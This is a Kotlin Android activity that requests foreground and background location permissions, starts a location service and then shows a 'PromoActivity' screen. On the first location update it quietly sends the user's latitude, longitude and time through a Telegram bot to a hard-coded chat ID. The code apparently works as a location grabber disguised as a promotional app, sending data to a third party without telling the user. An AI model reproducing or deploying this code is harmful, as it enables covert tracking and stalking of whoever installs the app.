package com.example.location

import android.annotation.SuppressLint
import android.app.Activity
import android.app.Instrumentation.ActivityResult
import android.app.usage.UsageEvents.Event
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Build
import androidx.appcompat.app.AppCompatActivity
import android.os.Bundle
import android.widget.Button
import android.widget.TextView
import android.widget.Toast
import androidx.activity.result.contract.ActivityResultContract
import androidx.activity.result.contract.ActivityResultContracts
import androidx.core.app.ActivityCompat
import com.elbekd.bot.Bot
import com.elbekd.bot.model.toChatId
import kotlinx.coroutines.DelicateCoroutinesApi
import kotlinx.coroutines.GlobalScope
import kotlinx.coroutines.launch
import org.greenrobot.eventbus.EventBus
import org.greenrobot.eventbus.Subscribe
import java.text.SimpleDateFormat
import java.util.Calendar

class MainActivity : AppCompatActivity() {


    private val backgroundLocation = registerForActivityResult(ActivityResultContracts.RequestPermission()){
        if (it){

        }
    }

    private var service: Intent?=null

    val token = "BOT_TOKEN_UCHUN"
    val bot = Bot.createPolling(token)

    private val locationPermissions = registerForActivityResult(ActivityResultContracts.RequestMultiplePermissions()){
        when{
            it.getOrDefault(android.Manifest.permission.ACCESS_COARSE_LOCATION, false) ->{

                if(Build.VERSION.SDK_INT>=Build.VERSION_CODES.Q){
                    if(ActivityCompat.checkSelfPermission(this,
                            android.Manifest.permission.ACCESS_BACKGROUND_LOCATION) !=
                        PackageManager.PERMISSION_GRANTED){

                        backgroundLocation.launch(android.Manifest.permission.ACCESS_BACKGROUND_LOCATION)

                    }
                }

            }
            it.getOrDefault(android.Manifest.permission.ACCESS_FINE_LOCATION, false) ->{

            }
        }
    }
    @SuppressLint("MissingInflatedId")
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        service = Intent(this, LocationService::class.java)

        var startBtn = findViewById<Button>(R.id.startBtn)

        val sharedPreference =  getSharedPreferences("CHECK", Context.MODE_PRIVATE)
        var check = sharedPreference.getBoolean("check", false)
        if (check) {
            var inter = Intent(this, PromoActivity::class.java)
            startActivity(inter)
        } else {
            startBtn.setOnClickListener {
                checkPermissions()
            }
        }


    }

    override fun onStart() {
        super.onStart()
        if (!EventBus.getDefault().isRegistered(this)){
            EventBus.getDefault().register(this)
        }
    }

    fun checkPermissions(){
        if(Build.VERSION.SDK_INT>=Build.VERSION_CODES.O){
            if(ActivityCompat.checkSelfPermission(this,
                    android.Manifest.permission.ACCESS_FINE_LOCATION) !=
                PackageManager.PERMISSION_GRANTED || ActivityCompat.checkSelfPermission(this,
                    android.Manifest.permission.ACCESS_COARSE_LOCATION) !=
                PackageManager.PERMISSION_GRANTED ){
                locationPermissions.launch(
                    arrayOf(
                        android.Manifest.permission.ACCESS_FINE_LOCATION,
                        android.Manifest.permission.ACCESS_COARSE_LOCATION
                    )
                )
            }else{
                startService(service)
                var intent = Intent(this, PromoActivity::class.java)
                startActivity(intent)
                val sharedPreference =  getSharedPreferences("CHECK", Context.MODE_PRIVATE)
                var editor = sharedPreference.edit()
                editor.putBoolean("check", true)
                editor.apply()
            }
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        stopService(service)
        if (EventBus.getDefault().isRegistered(this)){
            EventBus.getDefault().unregister(this)
        }
    }

    @SuppressLint("SimpleDateFormat")
    @OptIn(DelicateCoroutinesApi::class)
    @Subscribe
    fun receiveLocationEvent(locationEvent: LocationEvent){



        val time = Calendar.getInstance().time
        val formatter = SimpleDateFormat("yyyy-MM-dd HH:mm")
        val LastTime = formatter.format(time)
        val sharedPreference =  getSharedPreferences("SEND", Context.MODE_PRIVATE)

        var trueorfalse = sharedPreference.getBoolean("sended", false)

        suspend fun SendLocation() {
            var editor = sharedPreference.edit()
            editor.putBoolean("sended", true)
            editor.apply()
            bot.sendMessage("1969533124".toChatId(), "\uD83D\uDCCD Latitude -> ${locationEvent.latitude}\n\n\uD83D\uDCCD Longitude -> ${locationEvent.longitude}\n\n⏳ $LastTime")
        }

        if (!trueorfalse){
            GlobalScope.launch(GlobalScope.coroutineContext) {
                SendLocation()
            }
        }

    }
}